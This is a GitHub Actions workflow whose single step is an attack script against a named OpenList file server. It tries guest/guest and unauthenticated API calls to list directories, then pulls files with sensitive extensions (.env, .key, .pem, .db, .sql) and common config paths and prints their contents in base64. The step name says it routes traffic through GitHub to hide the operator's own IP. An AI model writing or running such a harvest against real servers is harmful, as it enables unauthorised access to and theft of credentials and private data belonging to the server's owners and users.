name: openlist-file-harvest
on:
  workflow_dispatch:
jobs:
  harvest:
    runs-on: ubuntu-latest
    steps:
      - name: OpenList guest/unauth file content harvest (GitHub relay, zero own-IP traffic)
        run: |
          set +e
          B="https://pan.yazinb.icu"
          echo "=== [1] login guest ==="
          LOGIN=$(curl -skS -m 20 -X POST "$B/api/auth/login" -H "Content-Type: application/json" -d '{"username":"guest","password":"guest"}')
          TOKEN=$(echo "$LOGIN" | python3 -c "import sys,json;d=json.load(sys.stdin);print(d.get('data',{}).get('token',''))" 2>/dev/null)
          echo "guest_token_len=${#TOKEN}"
          AUTH="Authorization: ${TOKEN}"

          list_dir () {
            local p="$1"; local mode="$2"
            local hdr=()
            [ "$mode" = "auth" ] && hdr=(-H "$AUTH")
            curl -skS -m 20 -X POST "$B/api/fs/list" "${hdr[@]}" -H "Content-Type: application/json" -d "{\"path\":\"$p\",\"page\":1,\"per_page\":200,\"refresh\":false}" -w "\nHTTP %{http_code}\n"
          }

          echo "=== [2] UNAUTH fs/list on / ==="
          list_dir "/" "noauth" | head -c 5000
          echo
          echo "=== [3] UNAUTH fs/list on /data ==="
          list_dir "/data" "noauth" | head -c 5000
          echo
          echo "=== [4] guest fs/list on /data ==="
          list_dir "/data" "auth" | head -c 5000
          echo

          echo "=== [5] dynamic harvest: list /data, download small sensitive files ==="
          list_dir "/data" "noauth" | python3 -c "
import sys,json
buf=sys.stdin.read()
try:
    j=json.loads(buf.split('HTTP')[0])
    for it in j.get('data',{}).get('content',[]):
        print(it.get('name',''))
except Exception as e:
    print('#parse_fail',repr(buf[:200]))
" > /tmp/names.txt
          echo "--- found names under /data (unauth) ---"
          cat /tmp/names.txt

          SENS=(".json" ".env" ".yaml" ".yml" ".bat" ".sh" ".txt" ".db" ".key" ".pem" ".conf" ".ini" ".sql" ".bak")
          while read -r nm; do
            [ -z "$nm" ] && continue
            lc=$(echo "$nm" | tr '[:upper:]' '[:lower:]')
            hit=0
            for ext in "${SENS[@]}"; do
              case "$lc" in *"$ext") hit=1;; esac
            done
            [ "$hit" -eq 0 ] && continue
            f="/data/$nm"
            echo "==== HARVEST $f ===="
            for mode in unauth auth; do
              hdr=(); [ "$mode" = "auth" ] && hdr=(-H "$AUTH")
              echo "-- $mode /api/fs/get --"
              curl -skS -m 20 -X POST "$B/api/fs/get" "${hdr[@]}" -H "Content-Type: application/json" -d "{\"path\":\"$f\"}" -w "\nHTTP %{http_code}\n" | head -c 800
              echo
              echo "-- $mode /api/fs/content (first 400 bytes, base64) --"
              curl -skS -m 20 -X POST "$B/api/fs/content" "${hdr[@]}" -H "Content-Type: application/json" -d "{\"path\":\"$f\"}" -o /tmp/c.bin -w "HTTP %{http_code} bytes=$(wc -c < /tmp/c.bin)\n"
              head -c 400 /tmp/c.bin | base64 -w0; echo
            done
          done < /tmp/names.txt

          echo "=== [6] hardcoded common config files anywhere ==="
          for f in "/data/config.json" "/data/.env" "/data/config.yaml" "/config.json" "/config.yaml" "/.env" "/data/users.db" "/data/data.db"; do
            for mode in unauth auth; do
              hdr=(); [ "$mode" = "auth" ] && hdr=(-H "$AUTH")
              curl -skS -m 20 -X POST "$B/api/fs/content" "${hdr[@]}" -H "Content-Type: application/json" -d "{\"path\":\"$f\"}" -o /tmp/c.bin -w "$mode $f -> HTTP %{http_code} bytes=$(wc -c < /tmp/c.bin)\n"
              echo "  base64(first300): $(head -c 300 /tmp/c.bin | base64 -w0)"
            done
          done
          echo "=== HARVEST DONE ==="
